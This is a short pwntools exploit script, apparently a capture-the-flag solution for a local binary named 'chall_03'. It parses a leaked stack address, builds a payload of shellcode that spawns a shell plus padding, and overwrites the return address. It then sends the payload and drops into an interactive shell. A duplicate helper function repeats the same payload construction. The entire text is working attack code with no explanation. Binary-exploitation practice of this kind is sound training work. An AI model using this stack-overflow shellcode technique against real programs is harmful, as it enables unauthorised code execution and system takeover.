from pwn import *
context.arch="amd64"

p = process("./chall_03")

leak = p.recv()
print(leak)
initial = leak.index(b")")+1
end = leak.index(b"\n", initial)
print(leak[initial:end])
addr = int(leak[initial:end], 16)
print(hex(addr))
asc = asm(shellcraft.sh())
payload = asc + b"A"*(0x140-len(asc)+8) + p64(addr) 

p.sendline(payload)
p.interactive()
res = p.recv()
print(res)

def do_stuff():
	leak = p.recv()
	print(leak)
	initial = leak.index(b")")+1
	end = leak.index(b"\n", initial)
	print(leak[initial:end])
	addr = int(leak[initial:end], 16)
	print(hex(addr))
	asc = asm(shellcraft.sh())
	payload = asc + b"A"*(0x140-len(asc)+8) + p64(addr) 
	return payload